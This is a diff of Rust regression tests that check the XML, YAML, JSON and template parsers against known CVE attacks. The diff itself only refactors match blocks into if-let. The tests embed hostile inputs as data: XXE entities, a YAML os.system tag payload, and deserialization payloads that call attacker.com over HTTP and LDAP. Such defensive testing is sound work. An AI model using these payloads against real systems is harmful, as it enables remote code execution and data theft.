@@ -183,17 +183,14 @@ fn test_cve_2026_2252_xxe_external_entity_fails_safely() {
 <root>&xxe;</root>"#;
     let result = xml::parse_value(&[string(malicious)], &no_args());
     // Should either error (entity not resolved) or return safe result
-    match result {
-        Ok(val) => {
-            // If it parses without error, entity should not be resolved
-            let s = format!("{}", val);
-            assert!(
-                !s.contains("root:") || val.as_map().is_some(),
-                "XXE must not return file contents: {}",
-                s
-            );
-        }
-        Err(_) => {} // Expected: quick-xml rejects DTD entities
+    if let Ok(val) = result {
+        // If it parses without error, entity should not be resolved
+        let s = format!("{}", val);
+        assert!(
+            !s.contains("root:") || val.as_map().is_some(),
+            "XXE must not return file contents: {}",
+            s
+        );
     }
 }
 
@@ -207,17 +204,14 @@ fn test_cve_2024_40896_xxe_parameter_entity_fails() {
 <root/>"#;
     let result = xml::parse_value(&[string(malicious)], &no_args());
     // quick-xml does not resolve DTD/parameter entities — safe parse or error
-    match result {
-        Ok(val) => {
-            let s = format!("{}", val);
-            // Content should NOT contain external entity expansions
-            assert!(
-                !s.contains("attacker.com"),
-                "XXE must not load remote content: {}",
-                s
-            );
-        }
-        Err(_) => {} // Rejected — also safe
+    if let Ok(val) = result {
+        let s = format!("{}", val);
+        // Content should NOT contain external entity expansions
+        assert!(
+            !s.contains("attacker.com"),
+            "XXE must not load remote content: {}",
+            s
+        );
     }
 }
 
@@ -227,12 +221,8 @@ fn test_cve_2026_25896_doc_type_with_period_name() {
     let xml = r#"<?xml version="1.0"?>
 <!DOCTYPE data SYSTEM "http://example.com/data.dtd">
 <data>&lt;hello&gt;</data>"#;
-    let result = xml::parse_value(&[string(xml)], &no_args());
     // Should parse safely (DOCTYPE ignored, entity refs not resolved)
-    match result {
-        Ok(_) => {}  // Safe parse
-        Err(_) => {} // Rejected - also safe
-    }
+    let _ = xml::parse_value(&[string(xml)], &no_args());
 }
 
 #[test]
@@ -247,16 +237,13 @@ fn test_cve_2026_28809_xxe_saml_style() {
   <ds:Signature>...</ds:Signature>
 </saml:Response>"#;
     let result = xml::parse_value(&[string(xml)], &no_args());
-    match result {
-        Ok(val) => {
-            let s = format!("{}", val);
-            assert!(
-                !s.contains("root:") || !s.contains("file://"),
-                "XXE must not leak files: {}",
-                s
-            );
-        }
-        Err(_) => {}
+    if let Ok(val) = result {
+        let s = format!("{}", val);
+        assert!(
+            !s.contains("root:") || !s.contains("file://"),
+            "XXE must not leak files: {}",
+            s
+        );
     }
 }
 
@@ -289,19 +276,16 @@ fn test_cve_2026_24009_yaml_no_rce_on_tagged_values() {
     // PyYAML !!python/object tag would execute code — serde_yaml must not
     let malicious = "!!python/object/apply:os.system ['echo pwned']";
     let result = yaml::parse_value(&[string(malicious)], &no_args());
-    match result {
-        Ok(val) => {
-            // serde_yaml deserializes tagged scalars as data, never as code.
-            // "!!python/object/apply:os.system" becomes a string key or value.
-            let s = format!("{}", val);
-            // The input text may appear as data, but os.system was never invoked.
-            assert!(
-                val.as_string().is_some() || val.as_list().is_some() || val.as_map().is_some(),
-                "YAML must deserialize tagged scalars as safe data, got: {}",
-                s
-            );
-        }
-        Err(_) => {} // Rejected — also safe
+    if let Ok(val) = result {
+        // serde_yaml deserializes tagged scalars as data, never as code.
+        // "!!python/object/apply:os.system" becomes a string key or value.
+        let s = format!("{}", val);
+        // The input text may appear as data, but os.system was never invoked.
+        assert!(
+            val.as_string().is_some() || val.as_list().is_some() || val.as_map().is_some(),
+            "YAML must deserialize tagged scalars as safe data, got: {}",
+            s
+        );
     }
 }
 
@@ -309,12 +293,9 @@ fn test_cve_2026_24009_yaml_no_rce_on_tagged_values() {
 fn test_cve_2020_14343_yaml_no_rce_via_full_loader() {
     let malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker.com/\"]]]]";
     let result = yaml::parse_value(&[string(malicious)], &no_args());
-    match result {
-        Ok(val) => {
-            // Tagged scalars become strings in serde_yaml, no class loading
-            assert!(val.as_string().is_some() || val.as_map().is_some() || val.as_list().is_some());
-        }
-        Err(_) => {}
+    if let Ok(val) = result {
+        // Tagged scalars become strings in serde_yaml, no class loading
+        assert!(val.as_string().is_some() || val.as_map().is_some() || val.as_list().is_some());
     }
 }
 
@@ -362,12 +343,9 @@ fn test_cve_2020_24750_json_no_jndi_lookup() {
     let malicious = r#"{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/evil","autoCommit":true}"#;
     let result = json::parse_value(&[string(malicious)], &no_args());
     // serde_json simply creates a map, no JNDI lookup
-    match result {
-        Ok(val) => {
-            let m = val.as_map().unwrap();
-            assert!(m.contains_key("@class"));
-        }
-        Err(_) => {}
+    if let Ok(val) = result {
+        let m = val.as_map().unwrap();
+        assert!(m.contains_key("@class"));
     }
 }
 
@@ -387,7 +365,7 @@ fn test_cve_2025_52999_deep_nesting_does_not_crash() {
     for _ in 0..200 {
         json.push_str("{\"a\":");
     }
-    json.push_str("1");
+    json.push('1');
     json.push_str(&"}".repeat(201));
 
     let result = json::parse_value(&[string(&json)], &no_args());
@@ -405,7 +383,7 @@ fn test_json_deep_nesting_128_works() {
     for _ in 0..126 {
         json.push_str("{\"a\":");
     }
-    json.push_str("1");
+    json.push('1');
     json.push_str(&"}".repeat(127));
 
     let result = json::parse_value(&[string(&json)], &no_args());
@@ -644,12 +622,9 @@ fn test_cve_2026_33916_no_prototype_pollution() {
     let args = vec![string(&template), Value::Map(ctx)];
     let result = template::render(&args, &no_args());
     // Partial "user" is not registered, so either empty or error
-    match result {
-        Ok(val) => {
-            let s = val.as_string().unwrap();
-            assert!(!s.contains("<script>"), "no XSS via partial: {}", s);
-        }
-        Err(_) => {}
+    if let Ok(val) = result {
+        let s = val.as_string().unwrap();
+        assert!(!s.contains("<script>"), "no XSS via partial: {}", s);
     }
 }
 
@@ -665,17 +640,14 @@ fn test_cve_2019_19919_no_ast_injection_rce() {
     for tmpl in &templates {
         let args = vec![string(tmpl), Value::Map(HashMap::new())];
         let result = template::render(&args, &no_args());
-        match result {
-            Ok(val) => {
-                let s = val.as_string().unwrap();
-                // Template should render without executing code
-                assert!(
-                    !s.contains("pwned"),
-                    "AST injection must not execute code: {}",
-                    s
-                );
-            }
-            Err(_) => {} // Error acceptable
+        if let Ok(val) = result {
+            let s = val.as_string().unwrap();
+            // Template should render without executing code
+            assert!(
+                !s.contains("pwned"),
+                "AST injection must not execute code: {}",
+                s
+            );
         }
     }
 }
@@ -698,12 +670,9 @@ fn test_handlebars_no_access_to_helpers() {
     let args = vec![string(&template), Value::Map(ctx)];
     let result = template::render(&args, &no_args());
     // Should either error or render empty
-    match result {
-        Ok(val) => {
-            let s = val.as_string().unwrap();
-            assert_eq!(s, "");
-        }
-        Err(_) => {}
+    if let Ok(val) = result {
+        let s = val.as_string().unwrap();
+        assert_eq!(s, "");
     }
 }
 
@@ -725,10 +694,10 @@ fn test_resource_exhaustion_json_extremely_long_string() {
 fn test_resource_exhaustion_many_nested_arrays_in_json() {
     let mut json = String::from("[");
     for _ in 0..10_000 {
-        json.push_str("[");
+        json.push('[');
     }
     for _ in 0..10_000 {
-        json.push_str("]");
+        json.push(']');
     }
     let result = json::parse_value(&[string(&json)], &no_args());
     assert!(result.is_err(), "10k nested arrays must be rejected");
@@ -738,11 +707,8 @@ fn test_resource_exhaustion_many_nested_arrays_in_json() {
 fn test_yaml_billion_laughs_rejected() {
     // YAML billion laughs attack — alias expansion
     let yaml = "a: &a [\"x\", \"x\", \"x\", \"x\", \"x\"]\nb: [*a, *a, *a, *a, *a]\nc: [*a, *a, *a, *a, *a]";
-    let result = yaml::parse_value(&[string(yaml)], &no_args());
-    match result {
-        Ok(_) => {} // serde_yaml may handle aliases safely
-        Err(_) => {}
-    }
+    // serde_yaml may handle aliases safely; Err is fine too.
+    let _ = yaml::parse_value(&[string(yaml)], &no_args());
 }
 
 #[test]
@@ -751,9 +717,5 @@ fn test_yaml_deep_nesting_rejected() {
     for _ in 0..500 {
         yaml.push_str("\n  a:");
     }
-    let result = yaml::parse_value(&[string(&yaml)], &no_args());
-    match result {
-        Ok(_) => {}
-        Err(_) => {}
-    }
+    let _ = yaml::parse_value(&[string(&yaml)], &no_args());
 }
